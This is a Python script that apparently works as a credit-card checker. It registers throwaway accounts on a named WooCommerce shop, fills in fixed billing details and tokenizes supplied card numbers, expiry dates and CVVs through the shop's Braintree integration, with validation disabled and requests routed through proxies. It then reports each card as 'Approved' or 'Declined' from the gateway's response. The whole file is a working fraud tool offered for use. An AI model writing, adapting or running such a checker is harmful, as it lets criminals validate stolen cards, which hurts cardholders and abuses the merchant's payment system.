import requests
import uuid
import base64
from httpx import AsyncClient

async def b3ccnauth(cc, mes, ano, cvv,proxyg):
    async with AsyncClient(proxies=proxyg,verify=False) as web:
        username = str(uuid.uuid4())
        email = str(uuid.uuid4()) + '@gmail.com'
        password = str(uuid.uuid4())


        req1 = await web.get('https://ghexperts.com/my-account/')
        register_n = req1.text.split('woocommerce-register-nonce" value="')[1].split('"')[0]
        print(register_n)

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://ghexperts.com',
            'pragma': 'no-cache',
            'priority': 'u=0, i',
            'referer': 'https://ghexperts.com/my-account/',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        }

        data = {
            'username': username,
            'email': email,
            'password': password,
            'wc_order_attribution_source_type': 'typein',
            'wc_order_attribution_referrer': 'https://ghexperts.com/my-account/add-payment-method/',
            'wc_order_attribution_utm_campaign': '(none)',
            'wc_order_attribution_utm_source': '(direct)',
            'wc_order_attribution_utm_medium': '(none)',
            'wc_order_attribution_utm_content': '(none)',
            'wc_order_attribution_utm_id': '(none)',
            'wc_order_attribution_utm_term': '(none)',
            'wc_order_attribution_utm_source_platform': '(none)',
            'wc_order_attribution_utm_creative_format': '(none)',
            'wc_order_attribution_utm_marketing_tactic': '(none)',
            'wc_order_attribution_session_entry': 'https://ghexperts.com/my-account/add-payment-method/',
            'wc_order_attribution_session_start_time': '2024-12-29 18:26:24',
            'wc_order_attribution_session_pages': '14',
            'wc_order_attribution_session_count': '1',
            'wc_order_attribution_user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'woocommerce-register-nonce': register_n,
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
        }

        req2 = await web.post('https://ghexperts.com/my-account/', headers=headers, data=data)
        req3 = await web.get('https://ghexperts.com/my-account/edit-address/billing/')
        edit_n = req3.text.split('woocommerce-edit-address-nonce" value="')[1].split('"')[0]
        print(edit_n)

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://ghexperts.com',
            'pragma': 'no-cache',
            'priority': 'u=0, i',
            'referer': 'https://ghexperts.com/my-account/edit-address/billing/',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        }

        data = {
            'billing_first_name': 'Sebastian',
            'billing_last_name': 'Gutierrez',
            'billing_company': 'Hunter',
            'billing_country': 'US',
            'billing_address_1': '103-105 Central Avenue',
            'billing_address_2': '',
            'billing_city': 'Orange',
            'billing_state': 'NJ',
            'billing_postcode': '07050-3824',
            'billing_phone': '15059947000',
            'billing_email': email,
            'save_address': 'Save address',
            'woocommerce-edit-address-nonce': edit_n,
            '_wp_http_referer': '/my-account/edit-address/billing/',
            'action': 'edit_address',
        }

        req4 = await web.post('https://ghexperts.com/my-account/edit-address/billing/', headers=headers, data=data)

        req5 = await web.get('https://ghexperts.com/my-account/add-payment-method/')
        client_token_nonce = req5.text.split('client_token_nonce":"')[1].split('"')[0]
        add_n = req5.text.split('woocommerce-add-payment-method-nonce" value="')[1].split('"')[0]
        print(add_n)
        print(client_token_nonce)
        headers = {
            'accept': '*/*',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://ghexperts.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://ghexperts.com/my-account/add-payment-method/',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            'action': 'wc_braintree_credit_card_get_client_token',
            'nonce': client_token_nonce,
        }

        req6 = await web.post('https://ghexperts.com/wp-admin/admin-ajax.php', headers=headers, data=data)
        btoken = req6.text.split('"data":"')[1].split('"}')[0]
        be_1 = base64.b64decode(btoken).decode("utf-8")
        fingerprint = be_1.split('"authorizationFingerprint":"')[1].split('"')[0]

        headers = {
            'accept': '*/*',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'authorization': 'Bearer ' + fingerprint,
            'braintree-version': '2018-05-10',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://ghexperts.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://ghexperts.com/',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        }

        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': 'a51cf8be-3ac9-4399-9566-84e2e0fb14c1',
            },
            'query': 'query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       privacyUrl       userAgreementUrl       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment     }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }',
            'operationName': 'ClientConfiguration',
        }

        req7 = await web.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

        headers = {
            'accept': '*/*',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'authorization': 'Bearer ' + fingerprint,
            'braintree-version': '2018-05-10',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://assets.braintreegateway.com/',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        }

        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': 'a51cf8be-3ac9-4399-9566-84e2e0fb14c1',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': cc,
                        'expirationMonth': mes,
                        'expirationYear': ano,
                        'cvv': cvv,
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        req8 = await web.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

        btcc = req8.text.split('"token":"')[1].split('"')[0]

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://ghexperts.com',
            'pragma': 'no-cache',
            'priority': 'u=0, i',
            'referer': 'https://ghexperts.com/my-account/add-payment-method/',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        }

        json_data = {
            "payment_method": "braintree_credit_card",
            "wc-braintree-credit-card-card-type": "visa",
            "wc-braintree-credit-card-3d-secure-enabled": "",
            "wc-braintree-credit-card-3d-secure-verified": "",
            "wc-braintree-credit-card-3d-secure-order-total": "0.00",
            "wc_braintree_credit_card_payment_nonce": btcc,
            "wc_braintree_device_data": {"correlation_id": "47aaec0bbebf53f164aa521184473121"},
            "wc-braintree-credit-card-tokenize-payment-method": "true",
            "wc_braintree_paypal_payment_nonce": "",
            "wc_braintree_device_data": {"correlation_id": "47aaec0bbebf53f164aa521184473121"},
            "wc-braintree-paypal-context": "shortcode",
            "wc_braintree_paypal_amount": "0.00",
            "wc_braintree_paypal_currency": "USD",
            "wc_braintree_paypal_locale": "en_us",
            "wc-braintree-paypal-tokenize-payment-method": "true",
            "woocommerce-add-payment-method-nonce": add_n,
            "_wp_http_referer": "/my-account/add-payment-method/",
            "woocommerce_add_payment_method": "1"
        }

        req9 = await web.post('https://ghexperts.com/my-account/add-payment-method/', headers=headers, data=json_data)
        
        if 'Payment method successfully added' in req9.text or 'New payment method added' in req9.text:
            status = "Approved ✅"
            mensaje = "1000: Approved"
        else:
            mensaje = req9.text.split('Status code ')[1].split('</li>')[0]
            if "2010" in mensaje:
                status = "Approved ✅"
            elif "2001" in mensaje:
                status = "Approved ✅"
            else:
                status = "Declined ❌"
        return mensaje, status